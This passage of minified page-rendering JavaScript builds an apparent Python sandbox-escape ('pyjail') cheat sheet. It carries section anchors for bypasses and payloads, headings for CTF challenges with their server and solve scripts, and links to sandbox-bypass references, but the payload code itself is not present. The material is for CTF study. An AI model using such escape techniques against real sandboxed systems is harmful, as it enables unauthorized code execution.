cb=o(zo);ji=i(cb,"chal.py"),cb.forEach(n),eb.forEach(n),ob.forEach(n),Ll=r(s),kn=t(s,"PRE",{class:!0});var F1=o(kn);F1.forEach(n),Tl=r(s),_n=t(s,"UL",{class:!0});var lb=o(_n);Wo=t(lb,"LI",{});var ub=o(Wo);Yo=t(ub,"CODE",{});var rb=o(Yo);Ni=i(rb,"solve.py"),rb.forEach(n),ub.forEach(n),lb.forEach(n),Al=r(s),dn=t(s,"PRE",{class:!0});var R1=o(dn);R1.forEach(n),Ol=r(s),fn=t(s,"H3",{id:!0});var kb=o(fn);Bp=t(kb,"A",{href:!0});var ib=o(Bp);Pi=i(ib,"GlacierCTF 2023: Avatar"),ib.forEach(n),kb.forEach(n),Fl=r(s),mn=t(s,"UL",{class:!0});var _b=o(mn);Go=t(_b,"LI",{});var db=o(Go);Vo=t(db,"CODE",{});var fb=o(Vo);Hi=i(fb,"server.py"),fb.forEach(n),db.forEach(n),_b.forEach(n),Rl=r(s),bn=t(s,"PRE",{class:!0});var I1=o(bn);I1.forEach(n),Il=r(s),yn=t(s,"UL",{class:!0});var mb=o(yn);$o=t(mb,"LI",{});var bb=o($o);Jo=t(bb,"CODE",{});var yb=o(Jo);Ui=i(yb,"solve.py"),yb.forEach(n),bb.forEach(n),mb.forEach(n),Dl=r(s),gn=t(s,"PRE",{class:!0});var D1=o(gn);D1.forEach(n),jl=r(s),wn=t(s,"H3",{id:!0});var gb=o(wn);qp=t(gb,"A",{href:!0});var wb=o(qp);Mi=i(wb,"TFC CTF 2023: My Third Calculator"),wb.forEach(n),gb.forEach(n),Nl=r(s),vn=t(s,"UL",{class:!0});var vb=o(vn);Ko=t(vb,"LI",{});var Eb=o(Ko);Zo=t(Eb,"CODE",{});var hb=o(Zo);Si=i(hb,"server.py"),hb.forEach(n),Eb.forEach(n),vb.forEach(n),Pl=r(s),En=t(s,"PRE",{class:!0});var j1=o(En);j1.forEach(n),Hl=r(s),hn=t(s,"UL",{class:!0});var xb=o(hn);Xo=t(xb,"LI",{});var Cb=o(Xo);Qo=t(Cb,"CODE",{});var Lb=o(Qo);Bi=i(Lb,"solve.py"),Lb.forEach(n),Cb.forEach(n),xb.forEach(n),Ul=r(s),xn=t(s,"PRE",{class:!0});var N1=o(xn);N1.forEach(n),Ml=r(s),Cn=t(s,"H3",{id:!0});var Tb=o(Cn);zp=t(Tb,"A",{href:!0});var Ab=o(zp);qi=i(Ab,"Equinor CTF 2023: Dis is it!"),Ab.forEach(n),Tb.forEach(n),Sl=r(s),Ln=t(s,"UL",{class:!0});var Ob=o(Ln);se=t(Ob,"LI",{});var Fb=o(se);ne=t(Fb,"CODE",{});var Rb=o(ne);zi=i(Rb,"main.py"),Rb.forEach(n),Fb.forEach(n),Ob.forEach(n),Bl=r(s),Tn=t(s,"PRE",{class:!0});var P1=o(Tn);P1.forEach(n),ql=r(s),An=t(s,"UL",{class:!0});var Ib=o(An);ae=t(Ib,"LI",{});var Db=o(ae);pe=t(Db,"CODE",{});var jb=o(pe);Wi=i(jb,"solve.py"),jb.forEach(n),Db.forEach(n),Ib.forEach(n),zl=r(s),On=t(s,"PRE",{class:!0});var H1=o(On);H1.forEach(n),Wl=r(s),Fn=t(s,"H3",{id:!0});var Nb=o(Fn);Wp=t(Nb,"A",{href:!0});var Pb=o(Wp);Yi=i(Pb,"37C3 Potluck CTF: tacocat"),Pb.forEach(n),Nb.forEach(n),Yl=r(s),Rn=t(s,"UL",{class:!0});var Hb=o(Rn);te=t(Hb,"LI",{});var Ub=o(te);oe=t(Ub,"CODE",{});var Mb=o(oe);Gi=i(Mb,"main.py"),Mb.forEach(n),Ub.forEach(n),Hb.forEach(n),Gl=r(s),In=t(s,"PRE",{class:!0});var U1=o(In);U1.forEach(n),Vl=r(s),Dn=t(s,"UL",{class:!0});var Sb=o(Dn);ee=t(Sb,"LI",{});var Bb=o(ee);ce=t(Bb,"CODE",{});var qb=o(ce);Vi=i(qb,"solve.py"),qb.forEach(n),Bb.forEach(n),Sb.forEach(n),$l=r(s),jn=t(s,"PRE",{class:!0});var M1=o(jn);M1.forEach(n),Jl=r(s),Nn=t(s,"H3",{id:!0});var zb=o(Nn);Yp=t(zb,"A",{href:!0});var Wb=o(Yp);$i=i(Wb,"Internet Festival 2023 CTF Finals: prison"),Wb.forEach(n),zb.forEach(n),Kl=r(s),Pn=t(s,"UL",{class:!0});var Yb=o(Pn);le=t(Yb,"LI",{});var Gb=o(le);ue=t(Gb,"CODE",{});var Vb=o(ue);Ji=i(Vb,"prison.py"),Vb.forEach(n),Gb.forEach(n),Yb.forEach(n),Zl=r(s),Hn=t(s,"PRE",{class:!0});var S1=o(Hn);S1.forEach(n),Xl=r(s),Un=t(s,"UL",{class:!0});var $b=o(Un);re=t($b,"LI",{});var Jb=o(re);ke=t(Jb,"CODE",{});var Kb=o(ke);Ki=i(Kb,"solve.py"),Kb.forEach(n),Jb.forEach(n),$b.forEach(n),Ql=r(s),Mn=t(s,"PRE",{class:!0});var B1=o(Mn);B1.forEach(n),su=r(s),Sn=t(s,"H3",{id:!0});var Zb=o(Sn);Gp=t(Zb,"A",{href:!0});var Xb=o(Gp);Zi=i(Xb,"WACON 2023 Prequal: ScavengerHunt"),Xb.forEach(n),Zb.forEach(n),nu=r(s),Bn=t(s,"UL",{class:!0});var Qb=o(Bn);ie=t(Qb,"LI",{});var sy=o(ie);_e=t(sy,"CODE",{});var ny=o(_e);Xi=i(ny,"prob.py"),ny.forEach(n),sy.forEach(n),Qb.forEach(n),au=r(s),qn=t(s,"PRE",{class:!0});var q1=o(qn);q1.forEach(n),pu=r(s),zn=t(s,"UL",{class:!0});var ay=o(zn);de=t(ay,"LI",{});var py=o(de);fe=t(py,"CODE",{});var ty=o(fe);Qi=i(ty,"secret.py"),ty.forEach(n),py.forEach(n),ay.forEach(n),tu=r(s),Wn=t(s,"PRE",{class:!0});var z1=o(Wn);z1.forEach(n),ou=r(s),Yn=t(s,"UL",{class:!0});var oy=o(Yn);me=t(oy,"LI",{});var ey=o(me);be=t(ey,"CODE",{});var cy=o(be);s_=i(cy,"solve.py"),cy.forEach(n),ey.forEach(n),oy.forEach(n),eu=r(s),Gn=t(s,"PRE",{class:!0});var W1=o(Gn);W1.forEach(n),cu=r(s),Vn=t(s,"H3",{id:!0});var ly=o(Vn);Vp=t(ly,"A",{href:!0});var uy=o(Vp);n_=i(uy,"CrewCTF 2023: starship-1"),uy.forEach(n),ly.forEach(n),lu=r(s),$n=t(s,"UL",{class:!0});var ry=o($n);ye=t(ry,"LI",{});var ky=o(ye);ge=t(ky,"CODE",{});var iy=o(ge);a_=i(iy,"sandbox.py"),iy.forEach(n),ky.forEach(n),ry.forEach(n),uu=r(s),Jn=t(s,"PRE",{class:!0});var Y1=o(Jn);Y1.forEach(n),ru=r(s),Kn=t(s,"UL",{class:!0});var _y=o(Kn);we=t(_y,"LI",{});var dy=o(we);ve=t(dy,"CODE",{});var fy=o(ve);p_=i(fy,"solve.py"),fy.forEach(n),dy.forEach(n),_y.forEach(n),ku=r(s),Zn=t(s,"PRE",{class:!0});var G1=o(Zn);G1.forEach(n),iu=r(s),Xn=t(s,"H3",{id:!0});var my=o(Xn);$p=t(my,"A",{href:!0});var by=o($p);t_=i(by,"CrewCTF 2023: starship"),by.forEach(n),my.forEach(n),_u=r(s),Qn=t(s,"UL",{class:!0});var yy=o(Qn);Ee=t(yy,"LI",{});var gy=o(Ee);he=t(gy,"CODE",{});var wy=o(he);o_=i(wy,"server.py"),wy.forEach(n),gy.forEach(n),yy.forEach(n),du=r(s),sa=t(s,"PRE",{class:!0});var V1=o(sa);V1.forEach(n),fu=r(s),na=t(s,"UL",{class:!0});var vy=o(na);xe=t(vy,"LI",{});var Ey=o(xe);Ce=t(Ey,"CODE",{});var hy=o(Ce);e_=i(hy,"solve.py"),hy.forEach(n),Ey.forEach(n),vy.forEach(n),mu=r(s),aa=t(s,"PRE",{class:!0});var $1=o(aa);$1.forEach(n),bu=r(s),pa=t(s,"H3",{id:!0});var xy=o(pa);Jp=t(xy,"A",{href:!0});var Cy=o(Jp);c_=i(Cy,"CrewCTF 2023: setjail"),Cy.forEach(n),xy.forEach(n),yu=r(s),ta=t(s,"UL",{class:!0});var Ly=o(ta);Le=t(Ly,"LI",{});var Ty=o(Le);Te=t(Ty,"CODE",{});var Ay=o(Te);l_=i(Ay,"main.py"),Ay.forEach(n),Ty.forEach(n),Ly.forEach(n),gu=r(s),oa=t(s,"PRE",{class:!0});var J1=o(oa);J1.forEach(n),wu=r(s),ea=t(s,"UL",{class:!0});var Oy=o(ea);Ae=t(Oy,"LI",{});var Fy=o(Ae);Oe=t(Fy,"CODE",{});var Ry=o(Oe);u_=i(Ry,"solve.py"),Ry.forEach(n),Fy.forEach(n),Oy.forEach(n),vu=r(s),ca=t(s,"PRE",{class:!0});var K1=o(ca);K1.forEach(n),Eu=r(s),la=t(s,"H3",{id:!0});var Iy=o(la);Kp=t(Iy,"A",{href:!0});var Dy=o(Kp);r_=i(Dy,"CrewCTF 2023: jailpie"),Dy.forEach(n),Iy.forEach(n),hu=r(s),ua=t(s,"UL",{class:!0});var jy=o(ua);Fe=t(jy,"LI",{});var Ny=o(Fe);Re=t(Ny,"CODE",{});var Py=o(Re);k_=i(Py,"server.py"),Py.forEach(n),Ny.forEach(n),jy.forEach(n),xu=r(s),ra=t(s,"PRE",{class:!0});var Z1=o(ra);Z1.forEach(n),Cu=r(s),ka=t(s,"UL",{class:!0});var Hy=o(ka);Ie=t(Hy,"LI",{});var Uy=o(Ie);De=t(Uy,"CODE",{});var My=o(De);i_=i(My,"solve.py"),My.forEach(n),Uy.forEach(n),Hy.forEach(n),Lu=r(s),ia=t(s,"PRE",{class:!0});var X1=o(ia);X1.forEach(n),Tu=r(s),_a=t(s,"H3",{id:!0});var Sy=o(_a);Zp=t(Sy,"A",{href:!0});var By=o(Zp);__=i(By,"SEETF 2023: Another PyJail"),By.forEach(n),Sy.forEach(n),Au=r(s),da=t(s,"UL",{class:!0});var qy=o(da);je=t(qy,"LI",{});var zy=o(je);Ne=t(zy,"CODE",{});var Wy=o(Ne);d_=i(Wy,"server.py"),Wy.forEach(n),zy.forEach(n),qy.forEach(n),Ou=r(s),fa=t(s,"PRE",{class:!0});var Q1=o(fa);Q1.forEach(n),Fu=r(s),ma=t(s,"UL",{class:!0});var Yy=o(ma);Pe=t(Yy,"LI",{});var Gy=o(Pe);He=t(Gy,"CODE",{});var Vy=o(He);f_=i(Vy,"solve.py"),Vy.forEach(n),Gy.forEach(n),Yy.forEach(n),Ru=r(s),ba=t(s,"PRE",{class:!0});var sw=o(ba);sw.forEach(n),Iu=r(s),ya=t(s,"H3",{id:!0});var $y=o(ya);Xp=t($y,"A",{href:!0});var Jy=o(Xp);m_=i(Jy,"BYUCTF 2023: Builtins 2"),Jy.forEach(n),$y.forEach(n),Du=r(s),ga=t(s,"UL",{class:!0});var Ky=o(ga);Ue=t(Ky,"LI",{});var Zy=o(Ue);Me=t(Zy,"CODE",{});var Xy=o(Me);b_=i(Xy,"b2.py"),Xy.forEach(n),Zy.forEach(n),Ky.forEach(n),ju=r(s),wa=t(s,"PRE",{class:!0});var nw=o(wa);nw.forEach(n),Nu=r(s),va=t(s,"UL",{class:!0});var Qy=o(va);Se=t(Qy,"LI",{});var sg=o(Se);Be=t(sg,"CODE",{});var ng=o(Be);y_=i(ng,"solve.py"),ng.forEach(n),sg.forEach(n),Qy.forEach(n),Pu=r(s),Ea=t(s,"PRE",{class:!0});var aw=o(Ea);aw.forEach(n),Hu=r(s),ha=t(s,"H3",{id:!0});var ag=o(ha);Qp=t(ag,"A",{href:!0});var pg=o(Qp);g_=i(pg,"BYUCTF 2023: a-z0-9"),pg.forEach(n),ag.forEach(n),Uu=r(s),xa=t(s,"UL",{class:!0});var tg=o(xa);qe=t(tg,"LI",{});var og=o(qe);ze=t(og,"CODE",{});var eg=o(ze);w_=i(eg,"a-z0-9.py"),eg.forEach(n),og.forEach(n),tg.forEach(n),Mu=r(s),Ca=t(s,"PRE",{class:!0});var pw=o(Ca);pw.forEach(n),Su=r(s),La=t(s,"UL",{class:!0});var cg=o(La);We=t(cg,"LI",{});var lg=o(We);Ye=t(lg,"CODE",{});var ug=o(Ye);v_=i(ug,"solve.py"),ug.forEach(n),lg.forEach(n),cg.forEach(n),Bu=r(s),Ta=t(s,"PRE",{class:!0});var tw=o(Ta);tw.forEach(n),qu=r(s),Aa=t(s,"H3",{id:!0});var rg=o(Aa);st=t(rg,"A",{href:!0});var kg=o(st);E_=i(kg,"BYUCTF 2023: Leet 2"),kg.forEach(n),rg.forEach(n),zu=r(s),Oa=t(s,"UL",{class:!0});var ig=o(Oa);Ge=t(ig,"LI",{});var _g=o(Ge);Ve=t(_g,"CODE",{});var dg=o(Ve);h_=i(dg,"leet2.py"),dg.forEach(n),_g.forEach(n),ig.forEach(n),Wu=r(s),Fa=t(s,"PRE",{class:!0});var ow=o(Fa);ow.forEach(n),Yu=r(s),Ra=t(s,"UL",{class:!0});var fg=o(Ra);$e=t(fg,"LI",{});var mg=o($e);Je=t(mg,"CODE",{});var bg=o(Je);x_=i(bg,"solve.py"),bg.forEach(n),mg.forEach(n),fg.forEach(n),Gu=r(s),Ia=t(s,"PRE",{class:!0});var ew=o(Ia);ew.forEach(n),Vu=r(s),Da=t(s,"H3",{id:!0});var yg=o(Da);nt=t(yg,"A",{href:!0});var gg=o(nt);C_=i(gg,"BYUCTF 2023: abcdefghijklm"),gg.forEach(n),yg.forEach(n),$u=r(s),ja=t(s,"UL",{class:!0});var wg=o(ja);Ke=t(wg,"LI",{});var vg=o(Ke);Ze=t(vg,"CODE",{});var Eg=o(Ze);L_=i(Eg,"abcdefghijklm.py"),Eg.forEach(n),vg.forEach(n),wg.forEach(n),Ju=r(s),Na=t(s,"PRE",{class:!0});var cw=o(Na);cw.forEach(n),Ku=r(s),Pa=t(s,"UL",{class:!0});var hg=o(Pa);Xe=t(hg,"LI",{});var xg=o(Xe);Qe=t(xg,"CODE",{});var Cg=o(Qe);T_=i(Cg,"solve.py"),Cg.forEach(n),xg.forEach(n),hg.forEach(n),Zu=r(s),Ha=t(s,"PRE",{class:!0});var lw=o(Ha);lw.forEach(n),Xu=r(s),Ua=t(s,"H3",{id:!0});var Lg=o(Ua);at=t(Lg,"A",{href:!0});var Tg=o(at);A_=i(Tg,"BYUCTF 2023: nopqrstuvwxyz"),Tg.forEach(n),Lg.forEach(n),Qu=r(s),Ma=t(s,"UL",{class:!0});var Ag=o(Ma);sc=t(Ag,"LI",{});var Og=o(sc);nc=t(Og,"CODE",{});var Fg=o(nc);O_=i(Fg,"nopqrstuvwxyz.py"),Fg.forEach(n),Og.forEach(n),Ag.forEach(n),sr=r(s),Sa=t(s,"PRE",{class:!0});var uw=o(Sa);uw.forEach(n),nr=r(s),Ba=t(s,"UL",{class:!0});var Rg=o(Ba);ac=t(Rg,"LI",{});var Ig=o(ac);pc=t(Ig,"CODE",{});var Dg=o(pc);F_=i(Dg,"solve.py"),Dg.forEach(n),Ig.forEach(n),Rg.forEach(n),ar=r(s),qa=t(s,"PRE",{class:!0});var rw=o(qa);rw.forEach(n),pr=r(s),za=t(s,"H2",{id:!0});var jg=o(za);pt=t(jg,"A",{href:!0});var Ng=o(pt);R_=i(Ng,"References"),Ng.forEach(n),jg.forEach(n),tr=r(s),h=t(s,"UL",{class:!0});var lt=o(h);tc=t(lt,"LI",{});var Pg=o(tc);M=t(Pg,"A",{href:!0,rel:!0,class:!0,target:!0});var Hg=o(M);I_=i(Hg,"https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes"),Hg.forEach(n),Pg.forEach(n),D_=r(lt),oc=t(lt,"LI",{});var Ug=o(oc);S=t(Ug,"A",{href:!0,rel:!0,class:!0,target:!0});var Mg=o(S);j_=i(Mg,"https://github.com/salvatore-abello/python-ctf-cheatsheet/blob/main/pyjails/README.md"),Mg.forEach(n),Ug.forEach(n),N_=r(lt),ec=t(lt,"LI",{});var Sg=o(ec);B=t(Sg,"A",{href:!0,rel:!0,class:!0,target:!0});var Bg=o(B);P_=i(Bg,"https://jbnrz.com.cn/index.php/2024/05/19/pyjail/"),Bg.forEach(n),Sg.forEach(n),lt.forEach(n),this.h()},h(){l(m,"href","#sinks"),l(_,"id","sinks"),l(Ga,"href","#retrieving-builtins"),l($,"id","retrieving-builtins"),l(J,"class","language-py"),l(Va,"href","#good-to-know-built-in-functions-and-methods"),l(K,"id","good-to-know-built-in-functions-and-methods"),l(Z,"class","language-py"),l($a,"href","#subclasses"),l(X,"id","subclasses"),l(Q,"class","language-py"),l(Ja,"href","#popular-modules"),l(ss,"id","popular-modules"),l(ns,"class","language-py"),l(Ka,"href","#bypasses-and-payloads"),l(as,"id","bypasses-and-payloads"),l(Za,"href","#decorators"),l(ps,"id","decorators"),l(ts,"class","language-py"),l(Xa,"href","#unicode-bypass"),l(os,"id","unicode-bypass"),l(es,"class","language-py"),l(Qa,"href","#audithook-bypass"),l(cs,"id","audithook-bypass"),l(ls,"class","language-py"),l(us,"class","language-py"),l(sp,"href","#assigning-attributes-and-variables"),l(rs,"id","assigning-attributes-and-variables"),l(ks,"class","language-py"),l(is,"class","language-py"),l(np,"href","#getting-attributes"),l(_s,"id","getting-attributes"),l(ds,"class","language-py"),l(fs,"class","language-py"),l(ap,"href","#running-functions-and-methods-without-parenthesis"),l(ms,"id","running-functions-and-methods-without-parenthesis"),l(bs,"class","language-py"),l(ys,"class","language-py"),l(pp,"href","#deleting-variables"),l(gs,"id","deleting-variables"),l(ws,"class","language-py"),l(tp,"href","#general-stuff"),l(vs,"id","general-stuff"),l(op,"href","#environment-variables"),l(Es,"id","environment-variables"),l(R,"href","https://www.elttam.com/blog/env/#python"),l(R,"rel","noopener"),l(R,"class","text-link"),l(R,"target","_blank"),l(I,"href","https://crazymanarmy.github.io/2023/01/18/idek-2022-CTF-Pyjail-Pyjail-Revenge-Writeup/index.html"),l(I,"rel","noopener"),l(I,"class","text-link"),l(I,"target","_blank"),l(z,"class","list"),l(F,"class","list"),l(ep,"href","#magic-methods"),l(xs,"id","magic-methods"),l(D,"href","https://rszalski.github.io/magicmethods/#appendix1"),l(D,"rel","noopener"),l(D,"class","text-link"),l(D,"target","_blank"),l(Cs,"class","list"),l(cp,"href","#help"),l(Ls,"id","help"),l(y,"class","list"),l(j,"href","https://github.com/SECCON/Beginners_CTF_2022/blob/main/misc/hitchhike4b/writeup.md"),l(j,"rel","noopener"),l(j,"class","text-link"),l(j,"target","_blank"),l(w,"class","list"),l(Ts,"class","language-py"),l(fp,"href","#format-string"),l(As,"id","format-string"),l(Os,"class","language-py"),l(mp,"href","#stable-payloads"),l(Fs,"id","stable-payloads"),l(Rs,"class","language-py"),l(bp,"href","#finding-sinks-from-modules"),l(Is,"id","finding-sinks-from-modules"),l(P,"href","https://github.com/search?q=repo%3Apython%2Fcpython+path%3ALib+%2Ffrom+os+import+environ%2F&type=code"),l(P,"rel","noopener"),l(P,"class","text-link"),l(P,"target","_blank"),l(gp,"class","list"),l(H,"href","https://github.com/search?q=repo%3Apython%2Fcpython+path%3ALib+%2Fimport+sys%2F&type=code"),l(H,"rel","noopener"),l(H,"class","text-link"),l(H,"target","_blank"),l(vp,"class","list"),l(N,"class","list"),l(Ep,"href","#generic-classes--bullet-points"),l(Ds,"id","generic-classes--bullet-points"),l(hp,"class","list"),l(W,"class","list"),l(C,"class","list"),l(L,"class","list"),l(Op,"class","list"),l(T,"class","list"),l(Ip,"class","list"),l(jp,"class","list"),l(Y,"class","list"),l(f,"class","list"),l(Np,"href","#ctf"),l(Ns,"id","ctf"),l(go,"href","#"),l(Ps,"id",""),l(Hs,"class","list"),l(Us,"class","language-py"),l(Pp,"href","#seccon-ctf-13-1linepyjail"),l(Ms,"id","seccon-ctf-13-1linepyjail"),l(Ss,"class","list"),l(Bs,"class","language-py"),l(qs,"class","list"),l(zs,"class","language-py"),l(Hp,"href","#idekctf-2024-crator"),l(Ws,"id","idekctf-2024-crator"),l(Ys,"class","list"),l(Gs,"class","language-py"),l(Vs,"class","list"),l($s,"class","language-py"),l(Js,"class","list"),l(Ks,"class","language-py"),l(Up,"href","#uiuctf-2024-astea"),l(Zs,"id","uiuctf-2024-astea"),l(Xs,"class","list"),l(Qs,"class","language-py"),l(sn,"class","list"),l(nn,"class","language-py"),l(Mp,"href","#vsctf-2024-llama-jail-revenge"),l(an,"id","vsctf-2024-llama-jail-revenge"),l(pn,"class","list"),l(tn,"class","language-py"),l(on,"class","list"),l(en,"class","language-py"),l(cn,"class","list"),l(ln,"class","language-py"),l(Sp,"href","#uoftctf-2024-zero"),l(un,"id","uoftctf-2024-zero"),l(rn,"class","list"),l(kn,"class","language-py"),l(_n,"class","list"),l(dn,"class","language-py"),l(Bp,"href","#glacierctf-2023-avatar"),l(fn,"id","glacierctf-2023-avatar"),l(mn,"class","list"),l(bn,"class","language-py"),l(yn,"class","list"),l(gn,"class","language-py"),l(qp,"href","#tfc-ctf-2023-my-third-calculator"),l(wn,"id","tfc-ctf-2023-my-third-calculator"),l(vn,"class","list"),l(En,"class","language-py"),l(hn,"class","list"),l(xn,"class","language-py"),l(zp,"href","#equinor-ctf-2023-dis-is-it"),l(Cn,"id","equinor-ctf-2023-dis-is-it"),l(Ln,"class","list"),l(Tn,"class","language-py"),l(An,"class","list"),l(On,"class","language-py"),l(Wp,"href","#37c3-potluck-ctf-tacocat"),l(Fn,"id","37c3-potluck-ctf-tacocat"),l(Rn,"class","list"),l(In,"class","language-py"),l(Dn,"class","list"),l(jn,"class","language-py"),l(Yp,"href","#internet-festival-2023-ctf-finals-prison"),l(Nn,"id","internet-festival-2023-ctf-finals-prison"),l(Pn,"class","list"),l(Hn,"class","language-py"),l(Un,"class","list"),l(Mn,"class","language-py"),l(Gp,"href","#wacon-2023-prequal-scavengerhunt"),l(Sn,"id","wacon-2023-prequal-scavengerhunt"),l(Bn,"class","list"),l(qn,"class","language-py"),l(zn,"class","list"),l(Wn,"class","language-py"),l(Yn,"class","list"),l(Gn,"class","language-py"),l(Vp,"href","#crewctf-2023-starship-1"),l(Vn,"id","crewctf-2023-starship-1"),l($n,"class","list"),l(Jn,"class","language-py"),l(Kn,"class","list"),l(Zn,"class","language-py"),l($p,"href","#crewctf-2023-starship"),l(Xn,"id","crewctf-2023-starship"),l(Qn,"class","list"),l(sa,"class","language-py"),l(na,"class","list"),l(aa,"class","language-py"),l(Jp,"href","#crewctf-2023-setjail"),l(pa,"id","crewctf-2023-setjail"),l(ta,"class","list"),l(oa,"class","language-py"),l(ea,"class","list"),l(ca,"class","language-py"),l(Kp,"href","#crewctf-2023-jailpie"),l(la,"id","crewctf-2023-jailpie"),l(ua,"class","list"),l(ra,"class","language-py"),l(ka,"class","list"),l(ia,"class","language-py"),l(Zp,"href","#seetf-2023-another-pyjail"),l(_a,"id","seetf-2023-another-pyjail"),l(da,"class","list"),l(fa,"class","language-py"),l(ma,"class","list"),l(ba,"class","language-py"),l(Xp,"href","#byuctf-2023-builtins-2"),l(ya,"id","byuctf-2023-builtins-2"),l(ga,"class","list"),l(wa,"class","language-py"),l(va,"class","list"),l(Ea,"class","language-py"),l(Qp,"href","#byuctf-2023-a-z0-9"),l(ha,"id","byuctf-2023-a-z0-9"),l(xa,"class","list"),l(Ca,"class","language-py"),l(La,"class","list"),l(Ta,"class","language-py"),l(st,"href","#byuctf-2023-leet-2"),l(Aa,"id","byuctf-2023-leet-2"),l(Oa,"class","list"),l(Fa,"class","language-py"),l(Ra,"class","list"),l(Ia,"class","language-py"),l(nt,"href","#byuctf-2023-abcdefghijklm"),l(Da,"id","byuctf-2023-abcdefghijklm"),l(ja,"class","list"),l(Na,"class","language-py"),l(Pa,"class","list"),l(Ha,"class","language-py"),l(at,"href","#byuctf-2023-nopqrstuvwxyz"),l(Ua,"id","byuctf-2023-nopqrstuvwxyz"),l(Ma,"class","list"),l(Sa,"class","language-py"),l(Ba,"class","list"),l(qa,"class","language-py"),l(pt,"href","#references"),l(za,"id","references"),l(M,"href","https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes"),l(M,"rel","noopener"),l(M,"class","text-link"),l(M,"target","_blank"),l(S,"href","https://github.com/salvatore-abello/python-ctf-cheatsheet/blob/main/pyjails/README.md"),l(S,"rel","noopener"),l(S,"class","text-link"),l(S,"target","_blank"),l(B,"href","https://jbnrz.com.cn/index.php/2024/05/19/pyjail/"),l(B,"rel","noopener"),l(B,"class","text-link"),l(B,"target","_blank"),l(h,"class","list")},m(s,e){c(s,d,e),a(d,v),a(v,O),c(s,q,e),c(s,_,e),a(_,m),a(m,Ya),c(s,cc,e),c(s,$,e),a($,Ga),a(Ga,ir),c(s,lc,e),c(s,J,e),J.innerHTML=Yg,c(s,uc,e),c(s,K,e),a(K,Va),a(Va,_r),c(s,rc,e),c(s,Z,e),Z.innerHTML=Gg,c(s,kc,e),c(s,X,e),a(X,$a),a($a,dr),c(s,ic,e),c(s,Q,e),Q.innerHTML=Vg,c(s,_c,e),c(s,ss,e),a(ss,Ja),a(Ja,fr),c(s,dc,e),c(s,ns,e),ns.innerHTML=$g,c(s,fc,e),c(s,as,e),a(as,Ka),a(Ka,mr),c(s,mc,e),c(s,ps,e),a(ps,Za),a(Za,br),c(s,bc,e),c(s,ts,e),ts.innerHTML=Jg,c(s,yc,e),c(s,os,e),a(os,Xa),a(Xa,yr),c(s,gc,e),c(s,es,e),es.innerHTML=Kg,c(s,wc,e),c(s,cs,e),a(cs,Qa),a(Qa,gr),c(s,vc,e),c(s,ls,e),ls.innerHTML=Zg,c(s,Ec,e),c(s,us,e),us.innerHTML=Xg,c(s,hc,e),c(s,rs,e),a(rs,sp),a(sp,wr),c(s,xc,e),c(s,ks,e),ks.innerHTML=Qg,c(s,Cc,e),c(s,is,e),is.innerHTML=s2,c(s,Lc,e),c(s,_s,e),a(_s,np),a(np,vr),c(s,Tc,e),c(s,ds,e),ds.innerHTML=n2,c(s,Ac,e),c(s,fs,e),fs.innerHTML=a2,c(s,Oc,e),c(s,ms,e),a(ms,ap),a(ap,Er),c(s,Fc,e),c(s,bs,e),bs.innerHTML=p2,c(s,Rc,e),c(s,ys,e),ys.innerHTML=t2,c(s,Ic,e),c(s,gs,e),a(gs,pp),a(pp,hr),c(s,Dc,e),c(s,ws,e),ws.innerHTML=o2,c(s,jc,e),c(s,vs,e),a(vs,tp),a(tp,xr),c(s,Nc,e),c(s,Es,e),a(Es,op),a(op,Cr),c(s,Pc,e),c(s,F,e),a(F,ut),a(ut,R),a(R,Lr),a(F,Tr),a(F,b),a(b,rt),a(rt,Ar),a(b,Or),a(b,kt),a(kt,Fr),a(b,Rr),a(b,it),a(it,Ir),a(b,Dr),a(b,_t),a(_t,jr),a(b,Nr),a(b,dt),a(dt,Pr),a(b,z),a(z,ft),a(ft,mt),a(mt,Hr),a(z,Ur),a(z,hs),a(hs,bt),a(bt,Mr),a(hs,Sr),a(hs,I),a(I,Br),c(s,Hc,e),c(s,xs,e),a(xs,ep),a(ep,qr),c(s,Uc,e),c(s,Cs,e),a(Cs,yt),a(yt,D),a(D,zr),c(s,Mc,e),c(s,Ls,e),a(Ls,cp),a(cp,Wr),c(s,Sc,e),c(s,w,e),a(w,gt),a(gt,Yr),a(w,Gr),a(w,lp),a(lp,Vr),a(lp,wt),a(wt,$r),a(w,Jr),a(w,up),a(up,Kr),a(up,y),a(y,rp),a(rp,vt),a(vt,Zr),a(rp,Xr),a(y,Qr),a(y,kp),a(kp,Et),a(Et,sk),a(kp,nk),a(y,ak),a(y,ip),a(ip,ht),a(ht,pk),a(ip,tk),a(y,ok),a(y,E),a(E,xt),a(xt,ek),a(E,ck),a(E,Ct),a(Ct,lk),a(E,uk),a(E,Lt),a(Lt,rk),a(E,kk),a(E,Tt),a(Tt,ik),a(y,_k),a(y,_p),a(_p,dk),a(_p,At),a(At,fk),a(w,mk),a(w,dp),a(dp,bk),a(dp,j),a(j,yk),c(s,Bc,e),c(s,Ts,e),Ts.innerHTML=e2,c(s,qc,e),c(s,As,e),a(As,fp),a(fp,gk),c(s,zc,e),c(s,Os,e),Os.innerHTML=c2,c(s,Wc,e),c(s,Fs,e),a(Fs,mp),a(mp,wk),c(s,Yc,e),c(s,Rs,e),Rs.innerHTML=l2,c(s,Gc,e),c(s,Is,e),a(Is,bp),a(bp,vk),c(s,Vc,e),c(s,N,e),a(N,yp),a(yp,P),a(P,Ek),a(yp,gp),a(gp,Ot),a(Ot,Ft),a(Ft,hk),a(N,xk),a(N,wp),a(wp,H),a(H,Ck),a(wp,vp),a(vp,Rt),a(Rt,It),a(It,Lk),c(s,$c,e),c(s,Ds,e),a(Ds,Ep),a(Ep,Tk),c(s,Jc,e),c(s,f,e),a(f,U),a(U,Dt),a(Dt,Ak),a(U,Ok),a(U,jt),a(jt,Fk),a(U,Rk),a(U,hp),a(hp,xp),a(xp,Nt),a(Nt,Ik),a(xp,Dk),a(f,jk),a(f,Cp),a(Cp,Pt),a(Pt,Nk),a(Cp,W),a(W,Ht),a(Ht,Ut),a(Ut,Pk),a(W,Hk),a(W,Mt),a(Mt,St),a(St,Uk),a(f,Mk),a(f,Lp),a(Lp,Bt),a(Bt,Sk),a(Lp,C),a(C,qt),a(qt,zt),a(zt,Bk),a(C,qk),a(C,Wt),a(Wt,Yt),a(Yt,zk),a(C,Wk),a(C,Gt),a(Gt,Vt),a(Vt,Yk),a(f,Gk),a(f,Tp),a(Tp,$t),a($t,Vk),a(Tp,L),a(L,Jt),a(Jt,Kt),a(Kt,$k),a(L,Jk),a(L,Zt),a(Zt,Xt),a(Xt,Kk),a(L,